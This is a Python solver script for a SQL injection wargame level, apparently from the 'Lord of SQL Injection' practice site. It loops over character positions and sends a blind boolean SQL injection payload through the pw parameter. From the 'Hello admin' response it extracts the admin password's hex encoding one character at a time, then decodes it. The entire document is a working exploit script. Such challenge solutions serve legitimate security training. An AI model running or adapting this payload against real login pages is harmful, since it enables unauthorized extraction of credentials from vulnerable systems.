import requests
import binascii
url = 'https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php'
cookie = {'PHPSESSID' : COOKIE}

pw = ""

for i in range(24):
    for j in range(47, 123):
        req_url = url + f"?pw= '||id='admin'%26%26substr(hex(pw), {i + 1}, 1)='{chr(j)}'%23"
        res = requests.get(req_url, cookies=cookie)
        if "<h2>Hello admin</h2>" in res.text:
            pw = pw + chr(j)
            print(pw)
            break

byte_data = bytes.fromhex(pw)
result_str = byte_data.decode('utf-16-be')
print(result_str)